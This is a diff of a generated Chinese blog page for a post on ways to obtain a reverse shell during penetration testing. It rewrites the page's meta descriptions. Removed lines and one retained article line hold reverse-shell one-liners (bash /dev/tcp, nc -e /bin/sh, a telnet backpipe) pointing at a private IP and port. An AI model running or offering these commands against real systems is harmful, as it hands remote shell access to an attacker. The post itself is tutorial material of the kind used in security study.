@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="http://172.30.61.219:4000">
   <title>反弹shell的各种姿势 | Stay bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
+  <meta name="description" content="渗透时如何反弹shell呢">
 <meta name="keywords" content="渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell的各种姿势">
 <meta property="og:url" content="http://172.30.61.219:4000/2019/10/10/反弹shell的各种姿势/index.html">
 <meta property="og:site_name" content="Stay bolg">
-<meta property="og:description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
+<meta property="og:description" content="渗透时如何反弹shell呢">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://172.30.61.219:4000/images/bash.jpg">
 <meta property="og:image" content="http://172.30.61.219:4000/images/nc.jpg">
@@ -24,10 +24,10 @@
 <meta property="og:image" content="http://172.30.61.219:4000/images/python2.jpg">
 <meta property="og:image" content="http://172.30.61.219:4000/images/perl1.jpg">
 <meta property="og:image" content="http://172.30.61.219:4000/images/perl2.jpg">
-<meta property="og:updated_time" content="2019-10-10T12:53:38.000Z">
+<meta property="og:updated_time" content="2019-10-10T12:55:51.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反弹shell的各种姿势">
-<meta name="twitter:description" content="1、bash反弹 1bash -i &amp;gt;&amp;amp; /dev/tcp/172.30.61.140/8888 0&amp;gt;&amp;amp;1    2、nc反弹 1nc -e /bin/sh 172.30.61.140 8888   3、telnet反弹 123mknod backpipe p &amp;amp;&amp;amp; telnet 172.30.61.140 8888 0&amp;lt;backpipe | /">
+<meta name="twitter:description" content="渗透时如何反弹shell呢">
 <meta name="twitter:image" content="http://172.30.61.219:4000/images/bash.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Stay bolg" type="application/atom+xml">
@@ -188,7 +188,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p> 1、bash反弹</p>
+        <p>渗透时如何反弹shell呢<a id="more"></a></p>
+<p> 1、bash反弹</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.30.61.140/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p> <img src="/images/bash.jpg" alt="bash"></p>
